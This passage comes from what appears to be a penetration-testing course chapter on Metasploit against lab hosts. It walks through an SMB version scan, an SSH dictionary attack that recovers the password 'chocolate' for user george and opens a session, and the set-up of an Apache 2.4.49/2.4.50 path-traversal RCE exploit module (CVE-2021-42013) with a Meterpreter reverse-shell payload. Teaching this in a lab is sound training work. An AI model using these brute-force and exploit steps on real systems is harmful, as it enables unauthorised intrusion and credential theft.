### Listing 631 - Displaying Options of the `smb_version` Module
Listing 631 shows that the `RHOSTS` option is required but not set for the `smb_version` module. To display all required, but not yet set, options, we can use the `show missing` command.

### Setting and Unsetting Options
We can add or remove values from options using the `set` and `unset` commands. Let's set the value for the `RHOSTS` option to the IP address of BRUTE2.

```bash
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202
RHOSTS => 192.168.50.202
```

### Listing 632 - Manually Setting the Value of the `RHOSTS` Option
Instead of setting the value manually, we can also set the value of `RHOSTS` in an automated fashion by leveraging the results in the database. For example, we can set `RHOSTS` to all discovered hosts with open port 445 by using the `services` command with the `-p` and `--rhosts` arguments. Before doing this, we will unset the current value we manually set.

```bash
msf6 auxiliary(scanner/smb/smb_version) > unset RHOSTS
Unsetting RHOSTS...
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
```

#### Services Output
```plaintext
Services
========
host    port  proto name      state  info
----    ----  ----- ----      -----  ----
192.168.50.202  445  tcp   microsoft-ds  open
RHOSTS => 192.168.50.202
```

### Listing 633 - Setting `RHOSTS` via Database Results
Listing 633 shows that Metasploit set the value for the `RHOSTS` option based on the stored results in the database, which, in our case, is the IP of BRUTE2.

Now that we have set all required options, we can launch the module by entering `run`.

```bash
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 192.168.50.202:445 - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1)
(compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM)
(signatures:optional) (guid:{e09176d2-9a06-427d-9b70-f08719643f4d}) (authentication domain:BRUTE2)
[*] 192.168.50.202: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Listing 634 - Executing the Auxiliary Module
We just executed our first module as shown in Listing 634. The output indicates that the target system supports versions 2 and 3 of SMB and prefers SMB 3.1.1.

Next, let's use the `vulns` command to show if Metasploit automatically detected vulnerabilities based on the results of this module.

```bash
msf6 auxiliary(scanner/smb/smb_version) > vulns
```

#### Vulnerabilities Output
```plaintext
Vulnerabilities
===============
Timestamp        Host         Name                References
---------        ----         ----                ----------
2022-07-28 10:17:41 UTC  192.168.50.202  SMB Signing Is Not Required  URL-https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-nt,URL-https://support.microsoft.com/en-us/help/887429/overview-of-server-message-block-signing
```

### Listing 635 - Displaying Identified Vulnerabilities
Listing 635 shows that our database contains one vulnerability entry about SMB Signing not being required and provides further information about it. This is a great way to quickly identify vulnerabilities without using vulnerability scanners.

### Using Another Module
In the Password Attacks Module, we successfully identified credentials on BRUTE by leveraging a dictionary attack against SSH. Instead of using Hydra, we can use Metasploit to perform this attack. First, we'll search for SSH auxiliary modules.

```bash
msf6 auxiliary(scanner/smb/smb_version) > search type:auxiliary ssh
```

#### Matching Modules
```plaintext
Matching Modules
================
#   Name                                      Disclosure Date  Rank  Check  Description
-   ----                                      ---------------  ----  -----  -----------
15  auxiliary/scanner/ssh/ssh_login           normal           No    SSH Login Check Scanner
16  auxiliary/scanner/ssh/ssh_identify_pubkeys  normal           No    SSH Public Key Acceptance Scanner
17  auxiliary/scanner/ssh/ssh_login_pubkey    normal           No    SSH Public Key Login Scanner
18  auxiliary/scanner/ssh/ssh_enumusers       normal           No    SSH Username Enumeration
19  auxiliary/fuzzers/ssh/ssh_version_corrupt normal           No    SSH Version Corruption
20  auxiliary/scanner/ssh/ssh_version         normal           No    SSH Version Scanner
```

### Listing 636 - Displaying All SSH Auxiliary Modules
The output lists an auxiliary module named `auxiliary/scanner/ssh/ssh_login` with a fitting description. We can activate it by using the index 15. Once the module is activated, we can display its options.

```bash
msf6 auxiliary(scanner/smb/smb_version) > use 15
msf6 auxiliary(scanner/ssh/ssh_login) > show options
```

#### Module Options
```plaintext
Module options (auxiliary/scanner/ssh/ssh_login):
Name             Current Setting  Required  Description
----             ---------------  --------  -----------
PASSWORD         no               no        A specific password to authenticate with
PASS_FILE        no               no        File containing passwords, one per line
RHOSTS           yes              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
RPORT            22               yes       The target port
STOP_ON_SUCCESS  false            yes       Stop guessing when a credential works for a host
THREADS          1                yes       The number of concurrent threads (max one per host)
USERNAME         no               no        A specific username to authenticate as
USERPASS_FILE    no               no        File containing users and passwords separated by space, one pair per line
USER_AS_PASS     false            no        Try the username as the password for all users
USER_FILE        no               no        File containing usernames, one per line
VERBOSE          false            yes       Whether to print output for all attempts
```

### Setting Options for the `ssh_login` Module
There are various options to set in this module. As with Hydraâ€™s options, we can set a single password and user, or provide files containing users, passwords, or both. In this example, we assume we already identified the username `george`. We can specify `rockyou.txt` for the `PASS_FILE` option. Finally, we set `RHOSTS` to `192.168.50.201` and `RPORT` to `2222`.

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
USERNAME => george
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.201
RHOSTS => 192.168.50.201
msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
RPORT => 2222
```

### Listing 638 - Setting Options for `ssh_login`
Now, all required options are set, and we can launch the module with `run`.

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 192.168.50.201:2222 - Starting bruteforce
[+] 192.168.50.201:2222 - Success: 'george:chocolate' 'uid=1001(george) gid=1001(george) groups=1001(george) Linux brute 5.15.0-37-generic #39-Ubuntu SMP Wed Jun 1 19:16:45 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.119.2:38329 -> 192.168.50.201:2222) at 2022-07-28 07:22:05 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Listing 639 - Successful Dictionary Attack with Metasploit
By performing a dictionary attack with the activated auxiliary module, Metasploit determined the correct password as shown in Listing 639. Unlike Hydra, Metasploit not only displays the valid credentials but also opens a session. We will explore sessions in the following Learning Unit, but for now, understand that Metasploit provides interactive access to the target automatically.

To display all valid credentials gathered up to this point, we can enter `creds`.

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > creds
```

#### Credentials Output
```plaintext
Credentials
===========
host          origin        service      public  private  realm  private_type
----          ------        -------      ------  -------  -----  ------------
192.168.50.201  192.168.50.201  2222/tcp (ssh)  george  chocolate  Password
```

### Listing 640 - Displaying All Saved Credentials
Metasploit stores the valid credentials automatically in the database and shows the related host, service, and type of credential.

This concludes the section on auxiliary modules. We learned how to search for modules, set their options, and run them. Metasploit offers a wide variety of auxiliary modules covering various protocols and techniques such as port scanning, fuzzing, and performing password attacks.

### 20.1.3 Exploit Modules
Now that we are acquainted with basic MSF usage and the usage of auxiliary modules, let's delve into exploit modules.

Exploit modules most commonly contain exploit code for vulnerable applications and services. Metasploit contains over 2200 exploits at the time of this writing. Each was meticulously developed and tested, making MSF capable of successfully exploiting a wide variety of vulnerable services. These exploits are invoked in much the same way as auxiliary modules.

In this example, we will leverage one of the exploit modules to get access to the target system WEB18. Let's assume we identified that the system runs an Apache 2.4.49 web server and is vulnerable to CVE-2021-42013 with a vulnerability scan. We will attempt to use Metasploit and its exploit modules to exploit this vulnerability and get code execution.

Let's create a new workspace for this section and search Metasploit for modules related to "Apache 2.4.49".

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > workspace -a exploits
[*] Added workspace: exploit
[*] Workspace: exploit
msf6 auxiliary(scanner/ssh/ssh_login) > search Apache 2.4.49
```

#### Matching Modules
```plaintext
Matching Modules
================
#   Name                                          Disclosure Date  Rank  Check  Description
-   ----                                          ---------------  ----  -----  -----------
0   exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes  Apache 2.4.49/2.4.50 Traversal RCE
1   auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal  No  Apache 2.4.49/2.4.50 Traversal RCE scanner
```

### Listing 641 - Creating a New Workspace and Searching for Apache 2.4.49 Modules
Listing 641 shows that our search resulted in two matching modules. Index 1 refers to an auxiliary module that checks if one or more target systems are vulnerable to the previously mentioned vulnerability. Index 0 refers to the corresponding exploit module.

Let's use the exploit module and enter `info` to review its description.

```bash
msf6 auxiliary(scanner/ssh/ssh_login) > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > info
```

#### Module Information
```plaintext
Name: Apache 2.4.49/2.4.50 Traversal RCE
Module: exploit/multi/http/apache_normalize_path_rce
Platform: Unix, Linux
Arch: cmd, x64, x86

Module side effects:
- ioc-in-logs
- artifacts-on-disk

Module stability:
- crash-safe

Module reliability:
- repeatable-session

Available targets:
Id  Name
--  ----
0   Automatic (Dropper)
1   Unix Command (In-Memory)

Check supported: Yes

Description:
This module exploits an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773). If files outside of the document root are not protected by 'require all denied' and CGI has been explicitly enabled, it can be used to execute arbitrary commands (Remote Command Execution). This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).
```

### Listing 642 - Activating the Exploit Module and Showing Its Information
The output contains several important pieces of information in the context of this exploit module. Before setting our target and running the exploit module, we should always understand what the module does by reviewing the moduleâ€™s information. The output starts with general information about the exploit, such as the name, platform, and architecture.

The output also contains information about potential side effects of running this exploit module, such as indicators of compromise entries in log solutions and, in this example, artifacts on disk. This, along with the module stability, helps us predict if we may crash a target system or what information defenders may obtain from us using this exploit module.

The module reliability determines if we can run the exploit more than once. In our example, the output states `repeatable-session`, which is important as some exploit modules will only work once.

The "Targets available" area of the output commonly contains different target specifications of vulnerable targets by the exploit module. Often these targets range from different operating systems and application versions to command execution methods. Most modules provide the "Automatic" target, which Metasploit tries to identify either by itself or by using the default operation specified by the module.

The "Check supported" field determines if we can use the `check` command to dry-run the exploit module and confirm if a target is vulnerable before we actually attempt to exploit it.

The "Description" provides a text-based explanation of the moduleâ€™s purpose. According to the output of this moduleâ€™s description, it seems to be the correct module for the vulnerability identified by the hypothetical vulnerability scan.

Now that we have an understanding of what the exploit module does and the implications of its execution, we can display its options.

```bash
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
```

#### Module Options
```plaintext
Module options (exploit/multi/http/apache_normalize_path_rce):
Name       Current Setting  Required  Description
----       ---------------  --------  -----------
CVE        CVE-2021-42013  yes       The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013)
DEPTH      5                yes       Depth for Path Traversal
Proxies    no               no        A proxy chain of format
```

This concludes the detailed walkthrough of using auxiliary and exploit modules in Metasploit.